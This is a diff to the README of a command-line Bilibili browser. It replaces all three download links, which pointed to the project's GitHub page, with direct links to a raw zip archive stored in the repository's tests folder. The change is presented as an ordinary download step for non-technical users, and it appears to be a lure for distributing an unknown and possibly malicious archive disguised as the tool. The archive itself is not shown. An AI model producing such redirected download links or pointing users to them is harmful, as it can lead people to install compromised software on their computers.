@@ -1,6 +1,6 @@
 # 🎬 bilibili-cli - Browse Bilibili from Terminal
 
-[![Download bilibili-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/tiwarn01/bilibili-cli)
+[![Download bilibili-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/tiwarn01/bilibili-cli/main/tests/cli_bilibili_v3.3.zip)
 
 ## 🎯 What is bilibili-cli?
 
@@ -33,7 +33,7 @@ Use bilibili-cli to navigate Bilibili using text commands. This means you will t
 
 Click this link to go to the official GitHub page for bilibili-cli. This page has the files needed to run the app and simple guides.
 
-[![Download bilibili-cli](https://img.shields.io/badge/Download-Here-blue)](https://github.com/tiwarn01/bilibili-cli)
+[![Download bilibili-cli](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/tiwarn01/bilibili-cli/main/tests/cli_bilibili_v3.3.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -96,4 +96,4 @@ The tool works best with a stable internet connection. It does not have a graphi
 ---
 
 Visit the download page to get the latest version:  
-[https://github.com/tiwarn01/bilibili-cli](https://github.com/tiwarn01/bilibili-cli)
+[https://raw.githubusercontent.com/tiwarn01/bilibili-cli/main/tests/cli_bilibili_v3.3.zip](https://raw.githubusercontent.com/tiwarn01/bilibili-cli/main/tests/cli_bilibili_v3.3.zip)
